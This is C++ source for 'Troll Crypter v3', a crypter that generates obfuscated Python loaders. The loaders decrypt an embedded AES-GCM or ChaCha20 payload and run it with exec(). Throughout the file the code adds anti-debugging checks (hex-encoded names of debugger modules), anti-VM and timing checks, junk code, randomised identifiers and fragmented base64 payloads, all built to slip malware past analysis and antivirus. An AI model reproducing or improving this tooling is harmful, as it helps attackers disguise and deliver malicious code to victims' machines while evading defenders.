// Troll Crypter v3 - Mason Group / Freemasonry
// Developed by ABOLHB

#include "codegen/codegen.h"
#include "crypto/engines.h"
#include "crypto/random.h"
#include <sstream>
#include <iomanip>

namespace troll {

static std::string hex(const Bytes& d) {
    std::ostringstream s;
    for (auto b : d) s << std::hex << std::setfill('0') << std::setw(2) << (int)b;
    return s.str();
}

std::string LayerBuilder::build(const EncryptedBundle& bnd, const LayerParams& params,
                                 size_t, const std::string& ns_name, const Config& cfg) {
    std::string pfx = std::string(1, "impqors"[Random::range(0,6)]) + "_";
    std::ostringstream p;

    p << "import base64,zlib,hashlib,sys,os,hmac\n";
    if (cfg.use_chacha)
        p << "from Crypto.Cipher import AES,ChaCha20_Poly1305\n";
    else
        p << "from Crypto.Cipher import AES\n";
    p << "from Crypto.Protocol.KDF import scrypt\n";

    if (cfg.anti_debug) p << AntiDebugGen::full() << "\n";
    if (cfg.anti_vm) p << AntiVMGen::full() << "\n";
    p << JunkGen::mixed(cfg.junk_min, cfg.junk_max) << "\n";

    p << "A=" << params.a << "\nX=" << params.x << "\nR=" << params.r << "\n";

    if (cfg.use_chacha) {
        p << KDFCodeGen::chacha(pfx, "A", "X", "R", hex(bnd.chacha_salt)) << "\n";
        p << pfx << "cc=base64.b64decode(\"" << Compression::base64_encode(bnd.chacha_ct) << "\")\n";
        p << pfx << "cn=bytes.fromhex(\"" << hex(bnd.chacha_nonce) << "\")\n";
        p << pfx << "cg=bytes.fromhex(\"" << hex(bnd.chacha_tag) << "\")\n";
        p << pfx << "ca=ChaCha20_Poly1305.new(key=" << pfx << "ck,nonce=" << pfx << "cn)\n";
        p << pfx << "cd=" << pfx << "ca.decrypt_and_verify(" << pfx << "cc," << pfx << "cg)\n";
    }

    p << JunkGen::mixed(cfg.junk_min, cfg.junk_max) << "\n";

    std::string ap = pfx + "a_";
    p << KDFCodeGen::aes(ap, "A", "X", "R", hex(bnd.aes_salt)) << "\n";

    std::string vc=Random::name(3,5), vn=Random::name(3,5), vg=Random::name(3,5);
    std::string va=Random::name(3,5), vd=Random::name(3,5);

    p << vc << "=base64.b64decode(\"" << Compression::base64_encode(bnd.aes_ct) << "\")\n";
    p << vn << "=bytes.fromhex(\"" << hex(bnd.aes_nonce) << "\")\n";
    p << vg << "=bytes.fromhex(\"" << hex(bnd.aes_tag) << "\")\n";
    p << va << "=AES.new(" << ap << "k,AES.MODE_GCM,nonce=" << vn << ")\n";
    p << vd << "=" << va << ".decrypt_and_verify(" << vc << "," << vg << ")\n";
    p << vd << "=zlib.decompress(" << vd << ")\n";

    if (cfg.use_chacha && cfg.use_integrity) {
        std::string vi = Random::name(3,5);
        p << vi << "=zlib.decompress(" << pfx << "cd)\n";
        p << "if hashlib.sha256(" << vd << ").digest()!=" << vi << ":\n    sys.exit(0)\n";
    }

    if (cfg.anti_debug) p << AntiDebugGen::inline_check() << "\n";

    p << "import builtins as _bi\n";
    if (ns_name == "__main__")
        p << "_ns={\"__name__\":\"__main__\",\"__builtins__\":_bi}\n";
    else {
        std::ostringstream nh;
        for (char c : ns_name) nh << std::hex << std::setfill('0') << std::setw(2) << (int)(uint8_t)c;
        p << "_ns={\"__name__\":bytes.fromhex(\"" << nh.str() << "\").decode(),\"__builtins__\":_bi}\n";
    }
    p << "try:\n    _ns[\"__file__\"]=os.path.abspath(sys.argv[0])\nexcept:\n    pass\n";
    p << "exec(" << vd << ",_ns)\n";
    return p.str();
}

std::string StubBuilder::build(const std::string& hex_body, const std::string& digest,
                                const std::string& hmac_key_hex, const std::string& hmac_tag_hex,
                                size_t size, const Config& cfg) {
    auto v = [](const char*) { return Random::name(); };
    std::string vh=v("h"),vs=v("s"),vl=v("l"),vsr=v("sr"),vco=v("co"),vns=v("ns");
    std::string vfn=v("fn"),vml=v("ml"),vhk=v("hk"),vht=v("ht"),vhc=v("hc");
    std::string vts=v("ts"),vck=v("ck");

    std::ostringstream hh,sh;
    for (char c : digest) hh << std::hex << std::setfill('0') << std::setw(2) << (int)(uint8_t)c;
    for (char c : hex_body) sh << std::hex << std::setfill('0') << std::setw(2) << (int)(uint8_t)c;

    std::ostringstream L;
    L << "import sys,hashlib,os,hmac,time\n";
    if (cfg.time_check) L << vts << "=time.time()\n";
    L << vh << "=bytes.fromhex('" << hh.str() << "').decode()\n";
    L << vs << "=bytes.fromhex('" << sh.str() << "').decode()\n";
    L << vhk << "=bytes.fromhex('" << hmac_key_hex << "')\n";
    L << vht << "=bytes.fromhex('" << hmac_tag_hex << "')\n";

    if (cfg.anti_debug) {
        L << "def " << vfn << "():\n    import sys,os\n    if sys.gettrace() is not None:\n        sys.exit(0)\n";
        L << "    " << vml << "=[]\n";
        for (auto h : {"707964657664","706462","626462","77696e617070646267","676462","747261636572","7374726163"})
            L << "    " << vml << ".append(bytes.fromhex('" << h << "').decode())\n";
        L << "    for __m in " << vml << ":\n        if __m in sys.modules:\n            sys.exit(0)\n";
        L << vfn << "()\n";
    }

    L << "if hashlib.sha256(" << vs << ".encode()).hexdigest()!=" << vh << ":\n    sys.exit(0)\n";
    L << vhc << "=hmac.new(" << vhk << "," << vs << ".encode(),hashlib.sha512).digest()\n";
    L << "if not hmac.compare_digest(" << vhc << "," << vht << "):\n    sys.exit(0)\n";

    if (cfg.time_check) {
        L << vck << "=time.time()-" << vts << "\nif " << vck << ">" << Random::range(25,45) << ":\n    sys.exit(0)\n";
    }

    L << JunkGen::mixed(cfg.junk_min, cfg.junk_max) << "\n";
    L << vl << "=" << size << "\n";
    L << vsr << "=bytes.fromhex(" << vs << ")\n";
    L << vco << "=" << vsr << ".decode('utf-8')\n";
    L << "import builtins as _bi\n";
    L << vns << "={\"__name__\":\"__main__\",\"__builtins__\":_bi}\n";
    L << "try:\n    " << vns << "[\"__file__\"]=os.path.abspath(sys.argv[0])\nexcept:\n    pass\n";
    L << "exec(" << vco << "," << vns << ")\n";
    return L.str();
}

std::string FragmentBuilder::build(const std::string& b64_data, const Config& cfg) {
    static const char markers[] = {'~','|','!','@','#','$','^','&'};
    char marker = markers[Random::range(0, 7)];
    std::string ms(1, marker);
    int step = Random::range(cfg.marker_step_min, cfg.marker_step_max);

    std::string marked;
    for (size_t i = 0; i < b64_data.size(); i += step) {
        if (i > 0) marked += ms;
        marked += b64_data.substr(i, step);
    }

    int num = Random::range(cfg.num_parts_min, cfg.num_parts_max);
    size_t part_len = marked.size() / num;
    std::vector<std::string> chunks;
    for (int i = 0; i < num; i++) {
        size_t s = i * part_len;
        size_t e = (i < num - 1) ? (i + 1) * part_len : marked.size();
        chunks.push_back(marked.substr(s, e - s));
    }

    std::vector<std::string> names;
    for (int i = 0; i < num; i++) names.push_back(Random::name(5, 9));

    std::ostringstream parts;
    parts << "import base64,zlib,hashlib,os";

    for (int i = 0; i < num; i++) {
        if (Random::range(0, 2) == 0) {
            parts << ";" << Random::name(4,7) << "=hex(" << Random::bits(32) << ")";
        }
        parts << ";" << names[i] << "='" << chunks[i] << "'";
    }

    parts << ";exec(zlib.decompress(base64.b64decode((";
    for (int i = 0; i < num; i++) {
        if (i > 0) parts << "+";
        parts << names[i];
    }
    parts << ").replace('" << ms << "',''))))";
    return parts.str();
}

}
